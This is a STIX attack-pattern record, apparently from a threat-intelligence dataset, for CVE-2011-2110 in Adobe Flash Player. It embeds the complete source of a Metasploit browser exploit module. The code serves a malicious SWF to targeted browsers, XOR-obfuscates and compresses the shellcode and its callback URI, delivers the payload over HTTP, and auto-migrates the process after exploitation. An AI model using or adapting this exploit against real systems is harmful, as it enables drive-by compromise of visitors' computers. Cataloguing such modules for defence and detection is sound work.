{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--39011198-2aaf-475a-b6f8-3a9d58bfd03c",
    "created": "2024-08-14T16:41:47.590831Z",
    "modified": "2024-08-14T16:41:47.590835Z",
    "name": "Adobe Flash Player AVM Verification Logic Array Indexing Code Execution",
    "description": " This module exploits a vulnerability in Adobe Flash Player versions 10.3.181.23 and earlier. This issue is caused by a failure in the ActionScript3 AVM2 verification logic. This results in unsafe JIT(Just-In-Time) code being executed. This is the same vulnerability that was used for attacks against Korean based organizations.  Specifically, this issue occurs when indexing an array using an arbitrary value memory can be referenced and later executed. Taking advantage of this issue does not rely on heap spraying as the vulnerability can also be used for information leakage.  Currently this exploit works for IE6, IE7, IE8, Firefox 10.2 and likely several other browsers under multiple Windows platforms. This exploit bypasses ASLR/DEP and is very reliable.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/adobe_flashplayer_arrayindexing.rb",
            "external_id": "adobe_flashplayer_arrayindexing.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-2110"
        },
        {
            "source_name": "reference",
            "url": "http://www.adobe.com/devnet/swf.html"
        },
        {
            "source_name": "reference",
            "url": "http://www.adobe.com/support/security/bulletins/apsb11-18.html"
        },
        {
            "source_name": "reference",
            "url": "http://www.accessroot.com/arteam/site/download.php?view.331"
        },
        {
            "source_name": "reference",
            "url": "http://www.shadowserver.org/wiki/pmwiki.php/Calendar/20110617"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Adobe Flash Player AVM Verification Logic Array Indexing Code Execution',\n      'Description'    => %q{\n          This module exploits a vulnerability in Adobe Flash Player versions 10.3.181.23\n        and earlier. This issue is caused by a failure in the ActionScript3 AVM2 verification\n        logic. This results in unsafe JIT(Just-In-Time) code being executed. This is the same\n        vulnerability that was used for attacks against Korean based organizations.\n\n          Specifically, this issue occurs when indexing an array using an arbitrary value,\n        memory can be referenced and later executed. Taking advantage of this issue does not rely\n        on heap spraying as the vulnerability can also be used for information leakage.\n\n          Currently this exploit works for IE6, IE7, IE8, Firefox 10.2 and likely several\n        other browsers under multiple Windows platforms. This exploit bypasses ASLR/DEP and\n        is very reliable.\n        },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'mr_me <steventhomasseeley[at]gmail.com>', # msf exploit\n          'Unknown'                                  # malware version seen used in targeted attacks\n        ],\n      'References'     =>\n        [\n          ['CVE', '2011-2110'],\n          ['OSVDB', '73007'],\n          ['BID', '48268'],\n          ['URL', 'http://www.adobe.com/devnet/swf.html'],\n          ['URL', 'http://www.adobe.com/support/security/bulletins/apsb11-18.html'],\n          ['URL', 'http://www.accessroot.com/arteam/site/download.php?view.331'],\n          ['URL', 'http://www.shadowserver.org/wiki/pmwiki.php/Calendar/20110617'],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC'             => 'process',\n          'HTTP::compression'    => 'gzip',\n          'HTTP::chunked'        => true,\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Payload'        =>\n        {\n          'Space'       => 2000,\n          'BadChars'    => \"\\x00\",\n          'DisableNops' => true\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', {}],\n        ],\n      'DisclosureDate' => '2012-06-21',\n      'DefaultTarget'  => 0))\n  end\n\n  def exploit\n    # src for the flash file: external/source/exploits/CVE-2011-2110/CVE-2011-2110.as\n    # full aslr/dep bypass using the info leak as per malware\n    path = File.join( Msf::Config.data_directory, \"exploits\", \"CVE-2011-2110.swf\" )\n    fd = File.open( path, \"rb\" )\n    @swf = fd.read(fd.stat.size)\n    fd.close\n    super\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def get_target(agent)\n    #If the user is already specified by the user, we'll just use that\n    return target if target.name != 'Automatic'\n\n    if agent =~ /MSIE/\n      return targets[0]  # ie 6/7/8 tested working\n    elsif agent =~ /Firefox/\n      return targets[0]  # ff 10.2 tested working\n    else\n      return nil\n    end\n  end\n\n  def on_request_uri(cli, request)\n    agent = request.headers['User-Agent']\n    my_target = get_target(agent)\n\n    # Avoid the attack if the victim doesn't have the same setup we're targeting\n    if my_target.nil?\n      print_error(\"#{cli.peerhost}:#{cli.peerport} - Browser not supported: #{agent.to_s}\")\n      send_not_found(cli)\n      return\n    end\n\n    xor_byte  = 122\n    trigger   = @swf\n    trigger_file = rand_text_alpha(rand(6)+3) + \".swf\"\n    code = rand_text_alpha(rand(6)+3) + \".txt\"\n\n    sc = Zlib::Deflate.deflate(payload.encoded)\n    shellcode = \"\"\n\n    sc.each_byte do | c |\n      shellcode << (xor_byte ^ c)\n    end\n\n    uri  = ((datastore['SSL']) ? \"https://\" : \"http://\")\n    uri << ((datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address('50.50.50.50') : datastore['SRVHOST'])\n    uri << \":#{datastore['SRVPORT']}#{get_resource()}/#{code}\"\n\n    bd_uri = Zlib::Deflate.deflate(uri)\n\n    uri = \"\"\n    bd_uri.each_byte do | c |\n      uri << (xor_byte ^ c)\n    end\n\n    bd_uri = uri.unpack(\"H*\")[0]\n\n    obj_id = rand_text_alpha(rand(6)+3)\n\n    if request.uri.match(/\\.swf/i)\n      print_status(\"Sending malicious swf\")\n      send_response(cli, trigger, { 'Content-Type' => 'application/x-shockwave-flash' })\n      return\n    end\n\n    if request.uri.match(/\\.txt/i)\n      print_status(\"Sending payload\")\n      send_response(cli, shellcode, { 'Content-Type' => 'text/plain' })\n      return\n    end\n\n    html =  <<-EOS\n    <html>\n    <head>\n    </head>\n    <body>\n    <center>\n    <object classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\"\n    id=\"#{obj_id}\" width=\"600\" height=\"400\"\n    codebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab\">\n    <param name=\"movie\" value=\"#{get_resource}/#{trigger_file}?info=#{bd_uri}\" />\n    <embed src=\"#{get_resource}/#{trigger_file}?info=#{bd_uri}\" quality=\"high\"\n    width=\"320\" height=\"300\" name=\"#{obj_id}\" align=\"middle\"\n    allowNetworking=\"all\"\n    type=\"application/x-shockwave-flash\"\n    pluginspage=\"http://www.macromedia.com/go/getflashplayer\">\n    </embed>\n    </object>\n    </center>\n    </body>\n    </html>\n    EOS\n\n    html = html.gsub(/^ {4}/, '')\n\n    print_status(\"Sending #{self.name} HTML\")\n    send_response(cli, html, { 'Content-Type' => 'text/html' })\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-06-21",
    "x_mitre_platforms": [
        "win'"
    ]
}